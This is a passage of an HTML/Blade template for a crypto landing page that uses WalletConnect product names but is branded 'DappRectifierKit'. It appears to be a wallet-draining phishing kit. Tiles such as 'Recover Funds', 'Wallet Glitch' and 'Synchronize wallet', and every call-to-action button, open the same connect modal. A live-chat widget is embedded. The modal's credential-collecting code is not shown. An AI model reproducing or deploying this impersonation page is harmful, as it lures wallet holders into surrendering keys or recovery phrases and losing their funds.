                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">To recover lost or missing funds.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Wallet Glitch</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For problems with trading wallet.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Defi Farming</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For defi farming/commercial farming issues.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-03.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Refresh Wallet</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">For wallet errors.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-04.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Recover Funds</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Recover funds.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-9">
                                    <div class="mint__item">
                                        <div class="mint__icon"><img src="{{asset('assets/img/icons/mint-01.png')}}"
                                                alt="icon" />
                                        </div>
                                        <div class="mint__content">
                                            <h3 class="title">Synchronization</h3>
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">
                                                <p class="desc">Synchronize wallet.</p>
                                            </a>
                                        </div>
                                    </div>
                                </div>

                            </div>
                        </div>
                    </div>
                </section>
                <div class="section-divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;"><img
                        src="{{asset('assets/img/others/divider-01.svg')}}" alt="divider" /></div>

                <section id="about" class="about-area section-pt-70 section-pb-80" style="background: #19195e;">
                    <div class="container">
                        <h6 class="brand__title">CORE PRODUCTS</h6>
                        <div class="about__row-reverse">
                            <div class="row align-items-center">
                                <div class="col-lg-6">
                                    <div class="about__img"
                                        data-anime="opacity:[0, 1]; translateX:[-24, 0]; onview: -250; delay: 200;">
                                        <img src="{{asset('assets/img/others/features-03.png')}}" alt="img" />
                                    </div>
                                </div>
                                <div class="col-lg-6">
                                    <div class="about__content"
                                        data-anime="opacity:[0, 1]; translateX:[24, 0]; onview: -250; delay: 300;">
                                        <div class="section__title text-start"><span
                                                class="sub-title tg-text-gradient">Web3Inbox</span>
                                        </div>
                                        <p class="text-white-50">Get notification from the apps you love. From DAO
                                            proposals
                                            to NFT drops,
                                            social updates
                                            to game requests -- get real-time notification from your favorite apps.
                                        </p>
                                        <div class="collection__btn text-center"
                                            data-anime="opacity:[0, 1]; translateY:[-24, 0]; onview: true; delay: 200;">
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal"
                                                class="btn gradient-btn"><span>Launch App</span>
                                                <i class="unicon-arrow-right"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="row align-items-center">
                                <div class="col-lg-6">
                                    <div class="about__img"
                                        data-anime="opacity:[0, 1]; translateX:[24, 0]; onview: -250; delay: 300;">
                                        <img src="{{asset('assets/img/others/features-02.png')}}" alt="img" />
                                    </div>
                                </div>
                                <div class="col-lg-6">
                                    <div class="about__content"
                                        data-anime="opacity:[0, 1]; translateX:[-24, 0]; onview: -250; delay: 400;">
                                        <div class="section__title text-start"><span
                                                class="sub-title tg-text-gradient">Sync
                                                and
                                                Track</span>
                                            <h2 class="title">Multiple Chains, One Home</h2>
                                        </div>
                                        <p class="text-white-50">We make it easy to Discover, Invest and manage all your
                                            NFTs at one place,
                                            looked up one of the
                                            more obscure.Find the right NFT collections to buy within the platform.</p>
                                        <div class="about__facts-list">
                                            <div class="about__icon-box">
                                                <div class="icon"><i class="unicon-select-02"></i></div>
                                                <p class="text-white-50">Collections Indexed every 5mins.</p>
                                            </div>
                                            <div class="about__icon-box">
                                                <div class="icon"><i class="unicon-select-window"></i></div>
                                                <p class="text-white-50">Difference in Floor &amp; Estimated Value</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>


                <div class="section-divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;"><img
                        src="{{ asset('assets/img/others/divider-01.svg')}}" alt="divider" /></div>
                <section id="collection" class="collection-area section-py-80">
                    <div class="container">
                        <div class="row justify-content-center"
                            data-anime="opacity:[0, 1]; translateY:[-24, 0]; onview: true; delay: 200;">
                            <div class="col-xl-8 col-lg-10">
                                <div class="section__title text-center title-mb-65">
                                    <h2 class="title">Latest artworks</h2>
                                </div>
                            </div>
                        </div>
                        <div class="row collection__items-list"
                            data-anime="targets: &gt; * &gt; *; opacity:[0, 1]; translateY:[48, 0]; onview: -400; delay: anime.stagger(100);">
                            <div class="col-lg-4 col-md-4 col-sm-6 col-11">
                                <div class="collection__item">
                                    <div class="collection__item-thumb"><a href="#"><img
                                                src="{{asset('assets/img/artwork/06.jpg')}}" alt="img" /></a>
                                    </div>
                                    <div class="collection__item-content">
                                        <h4 class="name">
                                            <span class="sub-title tg-text-gradient">Web3Modal</span>
                                        </h4>
                                        <span class="author">
                                            Web3Modal is a drop-in SDK to connect wallet users to apps, smoothly and
                                            securely
                                        </span>
                                        <div class="blog-post-meta mt-2">
                                            <ul class="list-wrap justify-content-center gap-2 text-center">
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Log in users by web app, mobile, and browser extension wallet.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Bring your app's UX alive with customizable UI.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Build fast with broad framework and Ethereum library support.
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="tagcloud justify-content-center mt-2">
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">start
                                                building</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-4 col-sm-6 col-11">
                                <div class="collection__item">
                                    <div class="collection__item-thumb"><a href="#"><img
                                                src="{{asset('assets/img/artwork/07.jpg')}}" alt="img" /></a>
                                    </div>
                                    <div class="collection__item-content">
                                        <h4 class="name">
                                            <span class="sub-title tg-text-gradient">Web3Inbox</span>
                                        </h4>
                                        <span class="author">
                                            Notification designed for web3
                                        </span>
                                        <div class="blog-post-meta mt-2">
                                            <ul class="list-wrap justify-content-center gap-2 text-center">
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Send real-time push notifications straight to a user's wallet.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Build authentic user relationships with customizable pings.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Explore creative engagement with in-app notifications.
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="tagcloud justify-content-center mt-2">
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">start
                                                building</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4 col-md-4 col-sm-6 col-11">
                                <div class="collection__item">
                                    <div class="collection__item-thumb"><a href="#"><img
                                                src="{{asset('assets/img/artwork/16.jpg')}}" alt="img" /></a>
                                    </div>
                                    <div class="collection__item-content">
                                        <h4 class="name">
                                            <span class="sub-title tg-text-gradient">Web3Wallet</span>
                                        </h4>
                                        <span class="author">
                                            The toolkit powering engaging wallet UX for interoperating with thousands of
                                            apps.
                                        </span>
                                        <div class="blog-post-meta mt-2">
                                            <ul class="list-wrap justify-content-center gap-2 text-center">
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Connect instantly to 5,000+ web3 and web2 apps.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Support multiple chains with no additional code.

                                                </li>
                                                <li>
                                                    <i class="fas fa-check-circle"></i>
                                                    Secure and inform users with Verify and Notify APIs.
                                                </li>
                                            </ul>
                                        </div>
                                        <div class="tagcloud justify-content-center mt-2">
                                            <a href="" data-bs-toggle="modal" data-bs-target="#connectModal">start
                                                building</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                        </div>

                    </div>
                </section>
                <div class="section-divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;"><img
                        src="{{asset('assets/img/others/divider-01.svg')}}" alt="divider" /></div>

                <section id="about" class="about-area section-pt-70 section-pb-80" style="background: #218573;">
                    <div class="container">
                        <div class="about__row-reverse">
                            <div class="row align-items-center">
                                <div class="col-lg-6">
                                    <div class="about__img"
                                        data-anime="opacity:[0, 1]; translateX:[24, 0]; onview: -250; delay: 300;">
                                        <img src="{{asset('assets/img/others/48.png')}}" alt="img" />
                                    </div>
                                </div>
                                <div class="col-lg-6">
                                    <div class="about__content"
                                        data-anime="opacity:[0, 1]; translateX:[-24, 0]; onview: -250; delay: 400;">
                                        <div class="section__title text-start">
                                            <span class="sub-title tg-text-gradient align-items-center gap-2">
                                                <i class="fas fa-cloud"></i>
                                                Cloud
                                            </span>
                                            <h4 class="name text-white">Insights to supercharge your growth</h4>
                                        </div>
                                        <p class="text-white-50">Discover how your product performs and learn ways to
                                            increase
                                            adoption with the WalletConnect Cloud's insightful analytics.</p>
                                        <div class="about__facts-list">
                                            <div class="about__icon-box">
                                                <div class="icon"><i class="fas fa-check-circle"></i></div>
                                                <p class="text-white-50">Get in-depth insights into your product usage.
                                                </p>
                                            </div>
                                            <div class="about__icon-box">
                                                <div class="icon"><i class="fas fa-check-circle"></i></div>
                                                <p class="text-white-50">Activate UX integrations like Verify and Notify
                                                    APIs</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>

                <section class="cta-area">
                    <div class="cta-bg" style="background-image:url(assets/img/bg/collection_cta.png)"></div>
                    <div class="container">
                        <div class="row justify-content-center">
                            <div class="col-xl-6 col-lg-8">
                                <div class="cta__content text-center"><img
                                        src="{{asset('assets/img/objects/circle-01.png')}}" width="24" alt="Object"
                                        style="top:0%;left:-16%" /><img src="{{asset('assets/img/objects/x.png')}}"
                                        width="24" alt="Object" style="bottom:16%;right:-8%" /><img
                                        src="{{asset('assets/img/objects/ethereum-02.png')}}" width="40" alt="Object"
                                        style="top:0%;right:-16%" /><img
                                        src="{{asset('assets/img/objects/bitcoin-01.png')}}" width="48" alt="Object"
                                        style="bottom:16%;left:-8%" />
                                    <h2 class="title">Build with WalletConnect</h2><a href="" data-bs-toggle="modal"
                                        data-bs-target="#connectModal" class="btn gradient-btn">Get
                                        started</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <div class="section-divider" data-anime="opacity:[0, 1]; scale:[0, 1]; onview: true; delay: 100;"><img
                        src="{{asset('assets/img/others/divider-01.svg')}}" alt="divider" /></div>
            </main>
            <footer class="footer-area section-py-80">
                <div class="container">
                    <div class="footer__wrapper"><img src="{{asset('assets/img/objects/ethereum-01.png')}}" width="32"
                            alt="object" style="top:32%;left:16%" /><img src="{{asset('assets/img/objects/x.png')}}"
                            width="16" alt="object" style="top:8%;right:16%" /><img
                            src="{{asset('assets/img/objects/circle-01.png')}}" width="16" alt="object"
                            style="bottom:24%;right:40%" /><img src="{{asset('assets/img/objects/circle-03.png')}}"
                            width="24" alt="object" style="bottom:-8%;left:30%" />
                        <div class="row justify-content-center">
                            <div class="col-xl-5 col-lg-7 col-md-9 col-sm-11">
                                <div class="footer__info text-center">
                                    <div class="footer-logo"><a aria-current="page" class="" href="index.html"><img
                                                src="{{asset('assets/img/logo/logosv.svg')}}" width="200"
                                                alt="Walletconnect" /></a>
                                    </div>
                                    <p>make it easy to sync various wallets issues on secure server.</p>
                                    <ul class="list-wrap footer__social">
                                        <li><a href="/"><i class="fab fa-twitter"></i></a></li>
                                        <li><a href="/"><i class="fab fa-discord"></i></a></li>
                                        <li><a href="/"><i class="fab fa-instagram"></i></a></li>
                                        <li><a href="/"><i class="fab fa-telegram-plane"></i></a></li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        <div class="copyright__wrapper">
                            <div class="row">
                                <div class="col-md-6">
                                    <div class="copyright__text">
                                        <p>©
                                            <!-- -->2025
                                            <!-- --> DappRectifierKit. All rights reserved.
                                        </p>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="copyright__menu">
                                        <ul class="list-wrap">
                                            <li><a href="/">Privacy policy</a></li>
                                            <li><a href="/">Terms of use</a></li>
                                            <li class="backTop"><button style="background:transparent;border:none"
                                                    class="scroll-to-target" data-target="html"><i
                                                        class="flaticon-arrowhead-up"></i></button></li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>
        <div id="gatsby-announcer"
            style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0"
            aria-live="assertive" aria-atomic="true"></div>
    </div>
    <script src="{{ asset('js/index.js') }}"></script>
    <script id="gatsby-script-loader">
        /*<![CDATA[*/
        window.pagePath = "/"; /*]]>*/
    </script>
    <!-- slice-start id="_gatsby-scripts-1" -->
    <script id="gatsby-chunk-mapping">
        window.___chunkMapping =
            "{\"app\":[\"/app-1e7c4eed68baef550aaa.js\"],\"component---src-pages-404-js\":[\"/component---src-pages-404-js-466f19515211d391e818.js\"],\"component---src-pages-blog-details-js\":[\"/component---src-pages-blog-details-js-a25d387a801ace966b7f.js\"],\"component---src-pages-blog-js\":[\"/component---src-pages-blog-js-ac6f325eeaf9c29331b1.js\"],\"component---src-pages-home-2-js\":[\"/component---src-pages-home-2-js-dfa9dd52ea4f25dbdd3e.js\"],\"component---src-pages-home-3-js\":[\"/component---src-pages-home-3-js-6d4c0bd64b232f2fc8c1.js\"],\"component---src-pages-index-js\":[\"/component---src-pages-index-js-0fcec6d42fc257524329.js\"]}";
    </script>
    <script>
        window.___webpackCompilationHash = "247488537796d05302d0";
    </script>

    <script src="{{ asset('js/webpack-runtime-250cffe9e4fb62ae4157.js') }}" async></script>
    <script src="{{ asset('js/framework-0956ea54d6cf417b15a1.js') }}" async></script>
    <script src="{{ asset('js/app-1e7c4eed68baef550aaa.js') }}" async></script>
    <!-- slice-end id="_gatsby-scripts-1" -->
    <div class="gtranslate_wrapper"></div>
    <script>window.gtranslateSettings = { "default_language": "en", "wrapper_selector": ".gtranslate_wrapper", "float_switcher_open_direction": "bottom" }</script>
    <script src="https://cdn.gtranslate.net/widgets/latest/float.js" defer></script>

    <!--Start of Tawk.to Script-->
    <script type="text/javascript">
        var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
        (function () {
            var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
            s1.async = true;
            s1.src = 'https://embed.tawk.to/67e2fc2be2fadb1909649562/1in7ai2mr';
            s1.charset = 'UTF-8';
            s1.setAttribute('crossorigin', '*');
            s0.parentNode.insertBefore(s1, s0);
        })();
    </script>
    <!--End of Tawk.to Script-->
</body>

</html>